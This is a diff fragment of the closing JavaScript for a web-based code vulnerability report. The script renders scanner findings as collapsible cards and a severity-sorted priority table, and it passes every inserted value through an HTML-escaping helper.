+      ? '<div class="flow-arrow">' + h.flow.map(n => `<span class="flow-node">${esc(n)}</span>`).join('<span class="flow-sep">→</span>') + '</div>'
+      : '<em style="color:#57606a">N/A</em>';
+
+    const snippetHTML = h.snippets.length
+      ? h.snippets.map(s => `<pre class="code-block">${esc(s)}</pre>`).join('')
+      : `<em style="color:#57606a">Pattern matched — no single-line snippet available.</em>`;
+
+    const mitigHTML = h.mitigations.map(m => `<li>${esc(m)}</li>`).join('');
+
+    const card = document.createElement('div');
+    card.className = 'finding-card';
+    card.innerHTML = `
+      <div class="finding-header" onclick="toggleFinding(this)">
+        <span class="sev-badge sev-${sc}">${esc(h.severity)}</span>
+        <span class="finding-title">${esc(h.title)}</span>
+        <span style="font-size:11px;color:#57606a;margin-left:auto;margin-right:8px;">Confidence: ${esc(h.confidence)}</span>
+        <span class="chevron">▶</span>
+      </div>
+      <div class="finding-body">
+        <div class="meta-row">
+          <div class="meta-item"><strong>Location</strong>${esc(fileLabel)}</div>
+          <div class="meta-item"><strong>CWE</strong>${esc(h.cwe)}</div>
+          <div class="meta-item"><strong>OWASP</strong>${esc(h.owasp)}</div>
+        </div>
+
+        <div class="section-label">Vulnerable Code Pattern</div>
+        ${snippetHTML}
+
+        <div class="section-label">Why This Is Vulnerable</div>
+        <p>${esc(h.why)}</p>
+
+        <div class="section-label">Attack Scenario</div>
+        <p>${esc(h.attack)}</p>
+
+        <div class="section-label">Data Flow</div>
+        ${flowHTML}
+
+        <div class="section-label">Impact</div>
+        <p>${esc(h.impact)}</p>
+
+        <div class="section-label">Recommended Patch</div>
+        <pre class="patch-block">${esc(h.patch)}</pre>
+
+        <div class="section-label">Additional Mitigations</div>
+        <ul style="padding-left:18px;font-size:13px;">${mitigHTML}</ul>
+      </div>
+    `;
+    container.appendChild(card);
+  });
+
+  document.getElementById('findings-section').style.display = 'block';
+
+  /* ── Priority table ── */
+  const sortedHits = [...hits].sort((a, b) => SEV_ORDER.indexOf(a.severity.toUpperCase()) - SEV_ORDER.indexOf(b.severity.toUpperCase()));
+  const tbody = document.getElementById('priority-body');
+  tbody.innerHTML = sortedHits.map((h, i) => `
+    <tr>
+      <td><strong>${i+1}</strong></td>
+      <td>${esc(h.title)}</td>
+      <td><span class="sev-badge sev-${sevClass(h.severity)}">${esc(h.severity)}</span></td>
+      <td style="color:#57606a;">${esc(h.impact.substring(0,120))}${h.impact.length>120?'…':''}</td>
+    </tr>`).join('');
+  document.getElementById('priority-section').style.display = 'block';
+
+  // Scroll to results
+  document.getElementById('summary-section').scrollIntoView({ behavior: 'smooth' });
+}
+
+/* ─── Toggle finding accordion ────────────────────── */
+function toggleFinding(header) {
+  const body = header.nextElementSibling;
+  const chev = header.querySelector('.chevron');
+  const isOpen = body.classList.toggle('open');
+  chev.classList.toggle('open', isOpen);
+}
+
+/* ─── HTML escape ──────────────────────────────────── */
+function esc(s) {
+  return String(s)
+    .replace(/&/g,'&amp;')
+    .replace(/</g,'&lt;')
+    .replace(/>/g,'&gt;')
+    .replace(/"/g,'&quot;')
+    .replace(/'/g,'&#039;');
+}
+</script>
+</body>
+</html>
